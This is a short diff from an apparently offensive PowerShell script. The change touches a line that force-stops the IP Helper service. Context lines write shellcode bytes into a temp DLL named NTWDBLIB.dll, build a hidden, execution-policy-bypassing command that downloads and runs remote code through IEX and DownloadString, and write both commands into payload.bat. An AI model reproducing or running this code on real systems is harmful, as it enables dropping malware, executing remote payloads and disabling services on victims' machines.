@@ -2928,7 +2928,7 @@ add-content -value $sc64 -encoding byte -path $env:temp\NTWDBLIB.dll
 
 $powercommand = "powershell.exe -windowstyle hidden -Exec ByPass IEX (new-object Net.WebClient).DownloadString('$url'); $command"
 $powercommand 
-$iphelper = "Stop-Service -Name iphlpsvc -Force"
+$iphelper = "powershell.exe Stop-Service -Name iphlpsvc -Force"
 $iphelper | OUT-file -encoding default -file $env:temp\payload.bat
 $powercommand | OUT-file -append -encoding default -file $env:temp\payload.bat
 #$Spayload= "start /b %temp%\pay.bat" | OUT-file -encoding default -file $env:temp\payload.bat
